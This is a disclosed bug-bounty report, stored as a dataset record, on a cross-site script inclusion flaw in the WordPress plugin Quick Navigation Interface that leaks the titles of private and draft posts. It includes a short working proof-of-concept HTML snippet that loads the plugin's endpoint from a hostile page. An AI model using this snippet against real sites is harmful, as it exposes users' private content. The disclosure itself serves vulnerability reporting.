---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '495525'
original_report_id: '495525'
title: 'XSSI: Quick Navigation Interface - leak of private page/post titles'
weakness: Information Disclosure
team_handle: iandunn-projects
created_at: '2019-02-13T20:31:28.931Z'
disclosed_at: '2019-02-15T08:03:49.617Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 14
asset_identifier: WordPress.org plugins
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# XSSI: Quick Navigation Interface - leak of private page/post titles

## Metadata

- HackerOne Report ID: 495525
- Weakness: Information Disclosure
- Program: iandunn-projects
- Disclosed At: 2019-02-15T08:03:49.617Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

CVSS
----

Medium 4.3 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N)

Description
-----------

The [Quick Navigation Interface](https://wordpress.org/plugins/quick-navigation-interface/) plugin includes the names of all posts and pages in an automatically generated JavaScript file. 

By including this file in their own page, an attacker can view all post titles - including those of drafts and private posts, which should remain secret - if an authenticated user visits their website.

POC
--- 

Setup: install the plugin & create a private post (set "Visibility" to "private").

While authenticated, visit a webpage that contains the following HTML code:

    <script src="http://192.168.0.104/wordpress5/wordpress/wp-admin/admin-ajax.php?action=qni_content_index"></script>
    <script>
    console.log(window.qniContentIndex); // in a real-world attack, this would be send to the attacker's server
    </script>

## Impact

disclosure of private post/page titles

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
